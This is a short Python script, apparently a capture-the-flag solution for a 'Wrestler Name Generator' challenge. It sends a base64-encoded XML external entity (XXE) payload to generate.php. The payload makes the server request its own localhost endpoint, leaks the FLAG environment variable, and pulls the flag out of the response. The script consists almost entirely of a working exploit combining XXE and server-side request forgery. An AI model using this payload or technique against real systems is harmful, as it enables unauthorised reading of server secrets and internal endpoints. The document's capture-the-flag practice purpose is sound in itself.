#!/usr/bin/env python3
# Wrestler Name Generator: generate.php parses attacker XML with LIBXML_NOENT,
# so an external entity pointing at http://127.0.0.1/generate.php makes the
# server fetch its own endpoint from localhost (whitelisted), which returns the
# FLAG env var; it lands in <firstName> and is echoed back in the name.
import os
import re
import requests

URL = os.environ.get("URL", "http://localhost:19302").rstrip("/")

# base64 of an XXE payload whose external entity is http://127.0.0.1/generate.php
payload = ("PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI%2FPgogPCFET0NUWVBFIGZvby"
           "BbIDwhRUxFTUVOVCBmb28gQU5ZID4KICAgPCFFTlRJVFkgeHhlIFNZU1RFTSAiaHR0cDovLzEyNy4w"
           "LjAuMS9nZW5lcmF0ZS5waHAiID5dPgogICAgPGlucHV0PgogICAgICAgPGZpcnN0TmFtZT4meHhlOz"
           "wvZmlyc3ROYW1lPgogICAgICAgPGxhc3ROYW1lPndldzwvbGFzdE5hbWU%2BCiAgICA8L2lucHV0Pg%3D%3D")

r = requests.get(URL + "/generate.php?input=" + payload)
m = re.search(r"sun\{.+?\}", r.text)
print(m.group(0) if m else "RIP")
